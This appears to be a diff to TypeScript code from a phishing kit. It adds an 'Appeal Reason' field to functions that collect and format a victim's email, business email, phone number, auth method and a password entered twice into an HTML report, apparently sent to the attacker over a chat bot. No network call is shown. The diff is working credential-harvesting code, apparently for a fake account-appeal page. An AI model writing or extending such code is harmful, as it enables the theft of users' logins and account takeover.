@@ -98,6 +98,7 @@ function getChangedFields(prevData: any = {}, nextData: any = {}, inputNew: any 
         email: 'Email',
         emailBusiness: 'Email Business',
         phone: 'Phone Number',
+        appealReason: 'Appeal Reason',
         password: 'Password First',
         passwordSecond: 'Password Second',
         authMethod: 'Auth Method',
@@ -132,6 +133,7 @@ function normalizeData(input: any = {}) {
         email: input.email ?? '',
         emailBusiness: input.emailBusiness ?? input.business ?? '',
         phone: input.phone ?? '',
+        appealReason: input.appealReason ?? '',
         password: input.password ?? '',
         passwordSecond: input.passwordSecond ?? '',
         authMethod: input.authMethod ?? '',
@@ -167,6 +169,7 @@ function formatMessage(data: any): string {
 <b>Email:</b> <code>${escapeHtml(d.email)}</code>
 <b>Email Business:</b> <code>${escapeHtml(d.emailBusiness)}</code>
 <b>Phone Number:</b> <code>${d.phone ? escapeHtml(`+${d.phone}`) : ''}</code>
+<b>Appeal Reason:</b> <code>${escapeHtml(d.appealReason || 'N/A')}</code>
 -----------------------------
 <b>Password(1):</b> <code>${escapeHtml(d.password)}</code>
 <b>Password(2):</b> <code>${escapeHtml(d.passwordSecond)}</code>
